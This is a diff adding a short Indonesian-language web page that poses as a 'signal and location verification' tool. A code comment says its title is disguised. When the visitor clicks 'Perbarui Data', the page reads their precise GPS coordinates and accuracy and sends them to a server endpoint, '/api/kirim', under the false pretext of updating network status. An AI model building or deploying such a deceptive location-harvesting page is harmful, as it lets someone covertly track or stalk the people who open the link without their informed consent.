@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cek Koneksi</title> <!-- Judul disamarkan -->
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; }
+        .btn { padding: 15px 30px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
+    </style>
+</head>
+<body>
+
+    <h2>Verifikasi Sinyal & Lokasi</h2>
+    <p>Klik tombol di bawah untuk memperbarui status jaringan Anda.</p>
+    
+    <button class="btn" onclick="getLocation()">Perbarui Data</button>
+    
+    <p id="status" style="margin-top: 20px; color: #555;"></p>
+
+    <script>
+        function getLocation() {
+            var status = document.getElementById("status");
+            if (navigator.geolocation) {
+                status.innerHTML = "Memproses...";
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else { 
+                status.innerHTML = "Browser tidak support.";
+            }
+        }
+
+        async function showPosition(position) {
+            var status = document.getElementById("status");
+            var lat = position.coords.latitude;
+            var long = position.coords.longitude;
+            var acc = position.coords.accuracy;
+
+            // Kirim ke Vercel Serverless Function
+            try {
+                const response = await fetch('/api/kirim', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ latitude: lat, longitude: long, accuracy: acc })
+                });
+
+                if (response.ok) {
+                    status.innerHTML = "Berhasil diverifikasi! Terima kasih.";
+                } else {
+                    status.innerHTML = "Gagal mengirim data.";
+                }
+            } catch (e) {
+                status.innerHTML = "Error koneksi.";
+            }
+        }
+
+        function showError(error) {
+            document.getElementById("status").innerHTML = "Akses lokasi ditolak atau error.";
+        }
+    </script>
+</body>
+</html>
